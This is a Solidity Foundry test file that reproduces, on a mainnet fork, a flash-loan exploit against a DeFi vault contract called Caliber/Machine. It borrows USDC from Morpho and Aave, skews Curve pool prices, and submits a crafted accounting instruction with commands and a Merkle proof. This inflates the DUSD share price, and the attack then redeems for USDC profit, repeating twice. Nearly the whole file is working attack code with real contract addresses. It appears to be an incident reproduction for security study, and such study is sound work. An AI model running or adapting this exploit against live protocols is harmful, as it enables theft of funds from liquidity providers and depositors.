// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

int128 constant N_COINS = 2;
int128 constant BASE_N_COINS = 3;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IDUSDUSDC {
    function add_liquidity(
        uint256[] calldata _amounts,
        uint256 _min_mint_amount
    ) external returns (uint256);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface I3Curve {
    function add_liquidity(
        uint256[BASE_N_COINS] calldata _amounts,
        uint256 _min_mint_amount
    ) external;
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_amount) external;
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface IFrax{
    function add_liquidity(
        uint256[N_COINS] calldata _amounts,
        uint256 _min_mint_amount
    ) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function remove_liquidity_one_coin(
        uint256 _burn_amount,
        int128 i,
        uint256 _min_amount
    ) external returns (uint256, uint256);
}

interface IMorpho {
    function flashLoan(address asset, uint256 amount, bytes calldata data) external;
}

interface IAaveV3 {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IMachine {
    function updateTotalAum() external;
}

interface ICaliber {
    enum InstructionType {
        MANAGEMENT,
        ACCOUNTING,
        HARVEST,
        FLASHLOAN_MANAGEMENT
    }

    /// @notice Instruction parameters.
    /// @param positionId The ID of the involved position.
    /// @param isDebt Whether the position is a debt.
    /// @param groupId The ID of the position accounting group.
    ///        Set to 0 if the instruction is not of type ACCOUNTING, or if the involved position is ungrouped.
    /// @param instructionType The type of the instruction.
    /// @param affectedTokens The array of affected tokens.
    /// @param commands The array of commands.
    /// @param state The array of state.
    /// @param stateBitmap The state bitmap.
    /// @param merkleProof The array of Merkle proof elements.
    struct Instruction {
        uint256 positionId;
        bool isDebt;
        uint256 groupId;
        InstructionType instructionType;
        address[] affectedTokens;
        bytes32[] commands;
        bytes[] state;
        uint128 stateBitmap;
        bytes32[] merkleProof;
    }
    function accountForPosition(Instruction calldata instruction) external returns (uint256, int256);
}

contract MakinaExp is Test {
    // Lending
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant AAVE_V3 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Curve pools
    address constant CURVE_DAI_USDC_USDT = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant FRAX_MIM_3CRV = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    address constant DUSDUSDC = 0x32E616F4f17d43f9A5cd9Be0e294727187064cb3;

    // Tokens
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant DUSD = 0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef;
    address constant CRV3 = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    // Buggy contract
    address constant CALIBER = 0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC;
    address constant MACHINE = 0x6b006870C83b1Cd49E766Ac9209f8d68763Df721;

    ICaliber caliber = ICaliber(CALIBER);
    IMachine machine = IMachine(MACHINE);

    function setUp() public {
        vm.createSelectFork("eth", 24_273_362 - 1);
    }

    function testExploit() public {
        // log USDC
        console.log("Attacker USDC before exploit:", IERC20(USDC).balanceOf(address(this)));
        console.log("DUSDUSDC USDC balance:", IERC20(USDC).balanceOf(DUSDUSDC));
        // Approve
        IERC20(USDC).approve(MORPHO, type(uint256).max);
        IERC20(USDC).approve(AAVE_V3, type(uint256).max);
        IERC20(USDC).approve(DUSDUSDC, type(uint256).max);
        IERC20(USDC).approve(CURVE_DAI_USDC_USDT, type(uint256).max);
        IERC20(DUSD).approve(DUSDUSDC, type(uint256).max);
        IERC20(CRV3).approve(FRAX_MIM_3CRV, type(uint256).max);
        IERC20(MIM).approve(FRAX_MIM_3CRV, type(uint256).max);

        console.log("======== Starting exploit... ========");
        IMorpho(MORPHO).flashLoan(USDC, IERC20(USDC).balanceOf(MORPHO), "");

        console.log("USDC PROFIT:", IERC20(USDC).balanceOf(address(this)));
        console.log("DUSDUSDC USDC balance:", IERC20(USDC).balanceOf(DUSDUSDC));
    }

    // Morpho flash callback
    function onMorphoFlashLoan(uint256 _assets, bytes calldata _data) external {
        IAaveV3(AAVE_V3).flashLoanSimple(address(this), USDC, 280_000_000_000_000 - IERC20(USDC).balanceOf(address(this)), "", 0);
    }
    
    // Aave flash callback
    function executeOperation(address _asset, uint256 _amount, uint256 _premium, address _initiator, bytes calldata _params) external returns (bool) {
        // log USDC
        console.log("USDC after flash loan:", IERC20(USDC).balanceOf(address(this)));
        // attack twice
        for (uint i = 0; i < 2; i++) {
            exp();
        }
        return true;
    }

    function exp() internal {
        // step 1 & 2: add liquidity and get DUSDUSDC with USDC
        uint256[] memory dusdUsdcAmounts = new uint256[](2);
        dusdUsdcAmounts[0] = 100_000_000_000_000;
        dusdUsdcAmounts[1] = 0;
        uint dusdusc = IDUSDUSDC(DUSDUSDC).add_liquidity(dusdUsdcAmounts, 0);
        console.log("DUSDUSDC LP received:", dusdusc);
        IDUSDUSDC(DUSDUSDC).exchange(0, 1, 10_000_000_000_000, 0); 

        // step 3: get CRV3 in CURVE_DAI_USDC_USDT, get ~163M CRV3
        I3Curve(CURVE_DAI_USDC_USDT).add_liquidity([uint(0), 170_000_000_000_000, 0], 0);

        // step 4: add liquidity to FRAX_MIM_3CRV, get ~30M Frax LP
        uint fraxLP = IFrax(FRAX_MIM_3CRV).add_liquidity([uint(0), 30_000_000_000_000_000_000_000_000], 0);
        console.log("FRAX_MIM_3CRV LP received:", fraxLP);


        // step 5: remove liquidity one coin 15M Frax LP to get MIM, made CRV3 cheap
        (uint256 mim1, ) = IFrax(FRAX_MIM_3CRV).remove_liquidity_one_coin(uint256(15_000_000_000_000_000_000_000_000), int128(0), uint256(0));
        console.log("MIM received from removing Frax LP:", mim1);

        // step 6: exchange 120M CRV3 to MIM in FRAX_MIM_3CRV
        uint mim2 = IFrax(FRAX_MIM_3CRV).exchange(1, 0, 120_000_000_000_000_000_000_000_000, 0);
        console.log("MIM received from exchanging CRV3:", mim2);

        // step 7: accountForPosition to overestimate position value
        address[] memory affectedTokens = new address[](3);
        affectedTokens[0] = DAI;
        affectedTokens[1] = USDC;
        affectedTokens[2] = USDT;

        bytes32[] memory commands = new bytes32[](11);

        // 1. 调用 Convex Reward 合约的 balanceOf(Caliber)，获取 LP Token 余额
        // Selector: 0x70a08231 (balanceOf)
        commands[0] = 0x70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc4771;

        // 2. 调用 Frax Pool 的 calc_withdraw_one_coin，计算这些 LP 对应多少 3Crv
        // Selector: 0x6d5433e6 (calc_withdraw_one_coin)
        commands[1] = 0x6d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91;

        // 3. 调用 Frax Pool 的 calc_withdraw_one_coin（中间步骤）
        // Selector: 0xcc2b27d7
        commands[2] = 0xcc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b;

        // 4. 调用额外的池/工具合约步骤（中间步骤）
        // Selector: 0x62de91e9
        commands[3] = 0x62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d;

        // 5. 调用 3Pool 的 totalSupply，作为后续比例计算的分母
        // Selector: 0x18160ddd (totalSupply)
        commands[4] = 0x18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e490;

        // 6. 连续调用 3Pool 的 balances(0, 1, 2) 获取 DAI/USDC/USDT 的储备量
        // Selector: 0x4903b0d1 (balances)
        commands[5] = 0x4903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c7; // DAI
        commands[6] = 0x4903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c7; // USDC
        commands[7] = 0x4903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7; // USDT

        // 7. 调用数学工具合约 (MathUtil) 执行 mulDiv 计算底层代币的具体数量
        // 公式: (3Crv_amount * Pool_Balance_i) / Total_Supply
        // Selector: 0xaa9a0912 (mulDiv)
        // 返回值将按顺序填入 state 供 accountForPosition 解码为 amounts[]
        commands[8] = 0xaa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91; // DAI Amount
        commands[9] = 0xaa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91; // USDC Amount
        commands[10] = 0xaa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb91; // USDT Amount

        // Construction of the states array based on the provided JSON
        bytes[] memory state = new bytes[](9);
        state[0] = ""; 
        state[1] = "";
        state[2] = "";
        // Index 3: A buffer or constant used in math operations (max uint256)
        state[3] = abi.encode(type(uint256).max); 
        // Index 4: The Caliber address itself (target for balanceOf)
        state[4] = abi.encode(0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC); 
        // Indices 5, 6, 7: Constants for Curve pool token indices (DAI=0, USDC=1, USDT=2)
        state[5] = abi.encode(uint256(0)); 
        state[6] = abi.encode(uint256(1)); 
        state[7] = abi.encode(uint256(2)); 
        state[8] = "";

        // Merkle Proof provided in the incident
        bytes32[] memory merkleProof = new bytes32[](7);
        merkleProof[0] = 0xa7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5a;
        merkleProof[1] = 0xf326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c;
        merkleProof[2] = 0x8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d;
        merkleProof[3] = 0x166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afed;
        merkleProof[4] = 0xede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209;
        merkleProof[5] = 0xbf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286;
        merkleProof[6] = 0xae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc401;

        ICaliber.Instruction memory instruction = ICaliber.Instruction({
                positionId: 329781725403426819283923979544582973776,
                isDebt: false,
                groupId: 0,
                instructionType: ICaliber.InstructionType.ACCOUNTING,
                affectedTokens: affectedTokens, // [DAI, USDC, USDT]
                commands: commands,             // The 11 commands discussed earlier
                state: state,
                stateBitmap: 41206067869332392060018018868690681856,
                merkleProof: merkleProof
            });
        
        // Call the function
        caliber.accountForPosition(instruction);

        // step 8: update Machine value to overestimate DUSD (share) price
        machine.updateTotalAum();
        console.log("DUSD price manipulated.");

        // step 9: redeem DUSD back to USDC
        IDUSDUSDC(DUSDUSDC).exchange(1, 0, IERC20(DUSD).balanceOf(address(this)), 0);
        console.log("USDC after redeeming DUSD:", IERC20(USDC).balanceOf(address(this)));

        // step 10: remove liquidity from DUSDUSDC
        uint usdc = IDUSDUSDC(DUSDUSDC).remove_liquidity_one_coin(IERC20(DUSDUSDC).balanceOf(address(this)), 0, 0);
        console.log("USDC received from removing DUSDUSDC LP:", usdc);

        // step 11: exchange MIM to 3Crv in FRAX_MIM_3CRV
        IFrax(FRAX_MIM_3CRV).exchange(0, 1, mim2, 0);
        console.log("3Crv received from exchanging MIM:", IERC20(CRV3).balanceOf(address(this)));

        // step 12: remove liquidity from FRAX_MIM_3CRV to get back CRV3
        (uint crv3_removed, )= IFrax(FRAX_MIM_3CRV).remove_liquidity_one_coin(IERC20(FRAX_MIM_3CRV).balanceOf(address(this)), 1, 0);
        console.log("3Crv received from removing Frax LP:", crv3_removed);

        // step 13: exchange MIM to CRV3 in FRAX_MIM_3CRV
        uint crv3 = IFrax(FRAX_MIM_3CRV).exchange(0, 1, mim1, 0);
        console.log("3Crv received from exchanging MIM:", crv3);

        console.log("Total 3Crv before removing from Curve:", IERC20(CRV3).balanceOf(address(this)));

        // step 14: remove liquidity from CURVE_DAI_USDC_USDT to get back USDC
        I3Curve(CURVE_DAI_USDC_USDT).remove_liquidity_one_coin(IERC20(CRV3).balanceOf(address(this)), 1, 0);
        console.log("USDC after removing liquidity from Curve:", IERC20(USDC).balanceOf(address(this)));

        // step 15: accountForPosition to reset position value
        caliber.accountForPosition(instruction);

        // step 16: update Machine value back to normal
        machine.updateTotalAum();

        // log USDC balance after exploit
        console.log("USDC after exploit:", IERC20(USDC).balanceOf(address(this)));
        console.log(" ======= ======= =======");
    }
}
